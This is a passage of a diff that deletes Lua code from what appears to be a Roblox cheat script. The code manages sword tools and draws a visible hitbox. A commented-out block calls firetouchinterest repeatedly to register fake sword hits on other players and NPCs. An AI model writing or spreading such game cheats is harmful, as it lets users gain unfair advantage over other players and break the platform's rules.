-			end)
-			CSword.Equipped:Connect(function()
-				Sword = CSword
-				local General = Options.GENERAL
-				if not Selection then
-					Selection = SelectionTemplate:Clone()
-					Selection.Transparency = General.Visible.Value and .5 or 1
-					--Selection.Touched:Connect(function(hit)
-					--	local Handle = Sword and Sword:FindFirstChild("Handle")
-					--	local O = Options.FTI
-					--	if Handle and O.FEnabled.Value then
-					--		local Parts = O.GetTouchingParts.Value and {hit} or Selection:GetTouchingParts()
-					--		for _,hit in pairs(Parts) do
-					--			local char = hit and hit.Parent
-					--			local hum = char and char:FindFirstChild("Humanoid")
-					--			local last = lastHits[hit.Name] or 0
-					--			local comp = tick()
-					--			if hum and hum.Health > 0 and hum:GetLimb(hit) ~= Enum.Limb.Unknown and comp - last > O.dt.Value and comp - absoluteLast > O.Abs.Value then
-					--				local nP = Players:GetPlayerFromCharacter(char)
-					--				local isBot = (not nP and TargetSettings.NPC)
-					--				local isPlayer = (nP and (not TargetSettings.Teammates or nP.Team ~= Player.Team) and ((nP.Neutral and TargetSettings.Teams.Neutral) or TargetSettings.Teams[nP.Team])) 
-					--				if isPlayer or isBot  then
-					--					if not General.Lunge.Value or Lunging[Sword] then
-					--						local t = tick()
-					--						lastHits[hit.Name] = t
-					--						absoluteLast = t
-					--						if hum and hum.Health > 0 and Handle:FindFirstChildOfClass("TouchTransmitter") then
-					--							for i = 1,O.Extra.Value do
-					--								firetouchinterest(hit,Handle,0)
-					--								firetouchinterest(hit,Handle,1)
-					--								RunService.RenderStepped:Wait()
-					--							end
-					--						end
-					--					end
-					--				end
-					--			end
-					--		end
-					--	end
-					--end)
-					SetSelectionSize()
-				end
-				SetSelectionColor()
-				Selection:BreakJoints()
-				Selection.CFrame = Handle.CFrame
-				local w = Instance.new("WeldConstraint")
-				w.Part0 = Selection; w.Part1 = Handle
-				local ToEnabled = DisableAdded()
-				w.Parent = Selection
-				Selection.Parent = workspace
-				Enable(ToEnabled)
-			end)
-			CSword.Unequipped:Connect(function()
-				if Sword ~= CSword then
-					Selection.Parent = nil
-				end
-			end)
-			TrackDestroyed(CSword)
-		else
-			SwordConnections[CSword] = nil
-		end
-	end
-end
-
-local function CharacterAdded(char)
-	for CSword,_ in pairs(SwordConnections) do
-		if IsDestroyed(CSword) then
-			DisconnectSword(CSword)
-		end
-	end
-	Sword = char:FindFirstChildOfClass("Tool")
-	char.ChildAdded:Connect(function(i)
-		if i.ClassName == 'Tool' then
-			Sword = i
-			AddSwordConnection(Sword)
-		end
-	end)
-	char.ChildRemoved:Connect(function(i)
-		if Sword == i then
-			Sword = nil
-		end
-	end)
-
-	G_LABEL.TextColor3 = Color3.new(1,1,1)
-	tween(Spawn_Msg())
-end
-Player.CharacterAdded:Connect(CharacterAdded)
-if Player.Character then
-	CharacterAdded(Player.Character)
-end
-
-
-NOTIFICATION_LABEL.Text = "Loaded"
-wait(.5)
-NOTE_OUT:Play()
